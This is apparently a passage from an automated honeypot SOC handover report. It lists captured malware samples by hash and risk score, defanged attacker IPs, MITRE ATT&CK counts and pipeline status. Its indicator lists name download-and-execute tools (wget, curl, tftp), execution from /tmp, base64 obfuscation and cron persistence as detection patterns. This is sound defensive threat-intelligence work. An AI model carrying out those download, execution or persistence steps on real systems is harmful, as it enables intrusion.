| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.89.160[.]135` | LU | Ghosty Networks LLC | **100** ⚠️ | 50 |
| `66.132.186[.]176` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 8 |
| `27.79.5[.]21` | VN | Viettel Group | **100** ⚠️ | 0 |
| `2.57.122[.]238` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `188.191.69[.]40` | UA | Centr Servisnogo Oblslugovuvannya Ltd | **100** ⚠️ | 2 |
| `138.68.63[.]15` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `92.118.39[.]77` | RO | DMZHOST | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 206 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 188 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 46 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 46 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 46 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 240 cases |
| Tool 34  | Credential Extractor        | ✅ 308 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 47 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (5.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 187 priority case(s) shown individually · 26 recon entry/entries in table (7 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-01T20:49:19Z_
